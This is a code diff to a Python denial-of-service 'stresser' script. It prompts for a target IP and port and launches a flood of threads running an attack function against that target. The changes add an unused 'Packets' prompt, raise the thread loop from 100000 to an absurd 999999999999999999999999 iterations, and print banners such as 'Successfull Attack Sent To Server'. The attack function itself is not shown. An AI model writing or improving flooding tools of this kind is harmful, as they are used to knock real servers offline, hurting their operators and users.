@@ -22,6 +22,7 @@ print(" ")
 print("\033[31m")
 ip = input("IP: ")
 port = int(input("Port: "))
+packets = input("Packets: ")
 time.sleep(2)
 print(" ")
 os.system("clear")
@@ -30,13 +31,14 @@ print("           ATTACK INFO")
 print("=================================")
 print(f"IP: {ip}")
 print(f"Port: {port}")
+print(f"Packets: {packets}")
 print("Stopped Stress: CTRL + Z")
 print("=================================")
 print("Successfull Attack Sent To Server")
 # Staring Stresser
 
-for i in range(100000):
+for i in range(999999999999999999999999):
   t = threading.Thread(target=attack,args=(ip, port), daemon=True)
   t.start()
 while True:
-  time.sleep(0)
+  time.sleep(1)
